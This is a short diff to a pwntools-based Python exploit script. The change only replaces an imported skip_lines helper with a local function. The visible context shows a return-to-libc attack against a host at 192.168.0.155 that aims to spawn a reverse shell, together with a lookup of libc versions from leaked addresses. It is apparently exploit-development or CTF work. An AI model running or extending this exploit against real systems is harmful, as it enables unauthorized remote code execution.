@@ -1,6 +1,6 @@
 import json
 import requests
-from pwn import remote, u32, p32, flat, log, skip_lines
+from pwn import remote, u32, p32, flat, log
 
 # Connection Information
 conn = '192.168.0.155'
@@ -92,7 +92,17 @@ def attemptR2Libc(putsOffset, systemOffset, exitOffset, binShOffset):
     
     # Check if reverse shell was spawned then handle user input and output for the process
     return handle_reverse_shell()
-    
+
+def skip_lines(proc, lines):
+    """
+    Skips a specified number of lines in the process output.
+    """
+    for _ in range(lines):
+        try:
+            proc.recvline()
+        except EOFError:
+            pass
+   
 # Get an array of all the potential libc versions that fit the puts and gets offsets provided
 def findPotentialLibcs(puts_addr,getsAddr):
     data = {"symbols": {"puts": hex(puts_addr),"gets": hex(getsAddr)}}
